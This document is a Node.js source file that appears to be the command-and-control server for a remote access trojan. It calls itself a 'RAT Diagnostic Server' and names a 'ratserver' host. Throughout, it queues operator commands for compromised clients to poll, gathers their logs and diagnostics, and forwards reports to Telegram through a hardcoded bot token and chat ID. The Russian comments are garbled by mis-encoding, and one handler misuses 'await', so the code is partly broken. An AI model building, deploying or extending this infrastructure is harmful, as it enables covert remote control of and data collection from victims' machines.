// server.js
const http = require('http');
const fetch = require('node-fetch');

// –•—Ä–∞–Ω–∏–ª–∏—â–µ –¥–∞–Ω–Ω—ã—Ö
let commandQueue = [];
let connectionLogs = [];
const TELEGRAM_BOT_TOKEN = "8079490877:AAEf1_SXzdbEjK88t6O4qyKhYnpE6U-hB44";
const TELEGRAM_CHAT_ID = "7581072357";

// –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ —Å –¥–µ—Ç–∞–ª–∏–∑–∞—Ü–∏–µ–π
function logAction(action, details, type = "INFO") {
    const timestamp = new Date().toLocaleString('ru-RU');
    const logEntry = {
        timestamp,
        action,
        details,
        type
    };
    
    console.log(`[${timestamp}] ${type}: ${action} - ${details}`);
    
    // –°–æ—Ö—Ä–∞–Ω—è–µ–º –ø–æ—Å–ª–µ–¥–Ω–∏–µ 100 –ª–æ–≥–æ–≤
    connectionLogs.push(logEntry);
    if (connectionLogs.length > 100) {
        connectionLogs = connectionLogs.slice(-100);
    }
    
    return logEntry;
}

// –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram
async function sendToTelegram(message) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        if (response.ok) {
            logAction("TELEGRAM_SEND", "–°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ —É—Å–ø–µ—à–Ω–æ");
            return true;
        } else {
            logAction("TELEGRAM_ERROR", `–û—à–∏–±–∫–∞ ${response.status}`, "ERROR");
            return false;
        }
    } catch (error) {
        logAction("TELEGRAM_ERROR", error.message, "ERROR");
        return false;
    }
}

const server = http.createServer((req, res) => {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.setHeader('Content-Type', 'application/json');

    // Handle preflight
    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }

    const requestId = Math.random().toString(36).substr(2, 8);
    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    logAction("REQUEST", `${req.method} ${req.url} from ${clientIP} [ID:${requestId}]`);

    if (req.method === 'POST' && req.url === '/client_command') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { command, args, client_id = "unknown" } = JSON.parse(body);
                
                logAction("BOT_COMMAND", `–ö–æ–º–∞–Ω–¥–∞ –æ—Ç –±–æ—Ç–∞: ${command} ${JSON.stringify(args)} [Client: ${client_id}]`, "COMMAND");

                // –î–æ–±–∞–≤–ª—è–µ–º –∫–æ–º–∞–Ω–¥—É –≤ –æ—á–µ—Ä–µ–¥—å —Å –º–µ—Ç–∫–æ–π –≤—Ä–µ–º–µ–Ω–∏
                const commandData = {
                    command: command,
                    args: args || [],
                    timestamp: new Date().toISOString(),
                    id: requestId,
                    client_id: client_id,
                    received_at: Date.now()
                };

                commandQueue.push(commandData);

                // –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º —Ä–∞–∑–º–µ—Ä –æ—á–µ—Ä–µ–¥–∏
                if (commandQueue.length > 50) {
                    commandQueue = commandQueue.slice(-50);
                }

                // –õ–æ–≥–∏—Ä—É–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –æ—á–µ—Ä–µ–¥–∏
                logAction("QUEUE_STATUS", `–†–∞–∑–º–µ—Ä: ${commandQueue.length}, –ü–æ—Å–ª–µ–¥–Ω—è—è: ${command}`, "DEBUG");

                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram –æ –ø–æ–ª—É—á–µ–Ω–∏–∏ –∫–æ–º–∞–Ω–¥—ã
                sendToTelegram(`<b>üì® –ö–æ–º–∞–Ω–¥–∞ –ø–æ–ª—É—á–µ–Ω–∞</b>\n<code>${command}</code>\nID: ${requestId}\n–ö–ª–∏–µ–Ω—Ç: ${client_id}`);

                res.end(JSON.stringify({ 
                    status: "OK", 
                    command: command,
                    queue_size: commandQueue.length,
                    request_id: requestId,
                    timestamp: new Date().toISOString()
                }));

            } catch (e) {
                logAction("PARSE_ERROR", `–û—à–∏–±–∫–∞ –ø–∞—Ä—Å–∏–Ω–≥–∞: ${e.message}`, "ERROR");
                res.statusCode = 400;
                res.end(JSON.stringify({ 
                    error: "Invalid JSON", 
                    details: e.message,
                    request_id: requestId 
                }));
            }
        });
        return;
    }

    if (req.method === 'GET' && req.url === '/get_command') {
        const client_id = req.headers['client-id'] || "unknown";
        
        logAction("CLIENT_REQUEST", `–ö–ª–∏–µ–Ω—Ç –∑–∞–ø—Ä–∞—à–∏–≤–∞–µ—Ç –∫–æ–º–∞–Ω–¥—É [Client: ${client_id}]`, "DEBUG");

        if (commandQueue.length > 0) {
            const command = commandQueue.shift();
            const delay = Date.now() - command.received_at;
            
            logAction("COMMAND_SENT", `–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –∫–æ–º–∞–Ω–¥–∞ ${command.command} –∫–ª–∏–µ–Ω—Ç—É ${client_id} (–∑–∞–¥–µ—Ä–∂–∫–∞: ${delay}ms)`, "SUCCESS");

            res.end(JSON.stringify({
                ...command,
                server_time: new Date().toISOString(),
                processing_delay: delay
            }));
        } else {
            logAction("NO_COMMANDS", `–ù–µ—Ç –∫–æ–º–∞–Ω–¥ –¥–ª—è –∫–ª–∏–µ–Ω—Ç–∞ ${client_id}`, "DEBUG");
            res.end(JSON.stringify({ 
                command: "", 
                args: [],
                timestamp: new Date().toISOString(),
                message: "No commands in queue",
                request_id: requestId
            }));
        }
        return;
    }

    if (req.method === 'POST' && req.url === '/client_log') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { message, type = "INFO", client_id = "unknown" } = JSON.parse(body);
                logAction(`CLIENT_${type}`, `${message} [Client: ${client_id}]`, type);
                
                // –í–∞–∂–Ω—ã–µ –ª–æ–≥–∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
                if (type === "ERROR" || type === "SUCCESS") {
                    sendToTelegram(`<b>üë§ –ö–ª–∏–µ–Ω—Ç ${client_id}</b>\n<code>${message}</code>`);
                }
                
                res.end(JSON.stringify({ status: "OK" }));
            } catch (e) {
                logAction("CLIENT_LOG_ERROR", e.message, "ERROR");
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid log data" }));
            }
        });
        return;
    }

    if (req.method === 'POST' && req.url === '/diagnostic') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                logAction("DIAGNOSTIC", `–î–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∞ –æ—Ç –∫–ª–∏–µ–Ω—Ç–∞: ${JSON.stringify(data)}`, "DEBUG");
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–æ–¥—Ä–æ–±–Ω—ã–π –æ—Ç—á–µ—Ç –≤ Telegram
                sendToTelegram(`<b>üîç –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê</b>\nüë§ –ö–ª–∏–µ–Ω—Ç: ${data.client_id || "unknown"}\nüïê –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}\nüìä –°—Ç–∞—Ç—É—Å: ${data.status || "N/A"}\nüìù –°–æ–æ–±—â–µ–Ω–∏–µ: ${data.message || "N/A"}`);
                
                res.end(JSON.stringify({ 
                    status: "OK", 
                    server_time: new Date().toISOString(),
                    queue_size: commandQueue.length 
                }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid diagnostic data" }));
            }
        });
        return;
    }

    if (req.method === 'GET' && req.url === '/debug') {
        const debugInfo = {
            server: {
                status: "online",
                version: "2.2-diagnostic",
                uptime: process.uptime(),
                timestamp: new Date().toISOString()
            },
            queue: {
                size: commandQueue.length,
                recent_commands: commandQueue.slice(-5).map(cmd => ({
                    command: cmd.command,
                    client: cmd.client_id,
                    time: cmd.timestamp
                }))
            },
            connections: {
                total_requests: connectionLogs.length,
                recent_logs: connectionLogs.slice(-10)
            }
        };
        
        res.end(JSON.stringify(debugInfo, null, 2));
        return;
    }

    if (req.method === 'GET' && req.url === '/ping') {
        logAction("PING", `Ping –∑–∞–ø—Ä–æ—Å –æ—Ç ${clientIP}`, "DEBUG");
        res.end(JSON.stringify({ 
            status: "pong", 
            timestamp: new Date().toISOString(),
            server: "RAT Diagnostic Server",
            version: "2.2"
        }));
        return;
    }

    if (req.method === 'GET' && req.url === '/test_telegram') {
        const success = await sendToTelegram(`<b>üß™ –¢–ï–°–¢ –¢–ï–õ–ï–ì–†–ê–ú–ê</b>\n–í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}\n–°–µ—Ä–≤–µ—Ä: ${req.headers.host}`);
        res.end(JSON.stringify({ 
            telegram_test: success ? "SUCCESS" : "FAILED",
            timestamp: new Date().toISOString()
        }));
        return;
    }

    res.writeHead(404);
    res.end(JSON.stringify({ 
        error: "Endpoint not found",
        available_endpoints: [
            "POST /client_command - –û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–º–∞–Ω–¥—É –æ—Ç –±–æ—Ç–∞",
            "GET /get_command - –ü–æ–ª—É—á–∏—Ç—å –∫–æ–º–∞–Ω–¥—É –¥–ª—è –∫–ª–∏–µ–Ω—Ç–∞", 
            "POST /client_log - –õ–æ–≥–∏ –æ—Ç –∫–ª–∏–µ–Ω—Ç–∞",
            "POST /diagnostic - –î–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∞",
            "GET /debug - –û—Ç–ª–∞–¥–æ—á–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è",
            "GET /ping - –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–≤—è–∑–∏",
            "GET /test_telegram - –¢–µ—Å—Ç Telegram"
        ]
    }));
});

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫ —Å–µ—Ä–≤–µ—Ä–∞
server.on('error', (error) => {
    logAction("SERVER_ERROR", error.message, "CRITICAL");
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`üöÄ –î–∏–∞–≥–Ω–æ—Å—Ç–∏—á–µ—Å–∫–∏–π —Å–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –Ω–∞ –ø–æ—Ä—Ç—É ${PORT}`);
    console.log(`üì° URL: https://ratserver-6wo3.onrender.com`);
    
    // –û—Ç–ø—Ä–∞–≤–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –∑–∞–ø—É—Å–∫–µ
    sendToTelegram(`<b>üü¢ –î–ò–ê–ì–ù–û–°–¢–ò–ß–ï–°–ö–ò–ô –°–ï–†–í–ï–† –ó–ê–ü–£–©–ï–ù</b>\nüìç Port: ${PORT}\n‚è∞ ${new Date().toLocaleString('ru-RU')}\nüîß –†–µ–∂–∏–º: –î–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∞`);
});

module.exports = server;
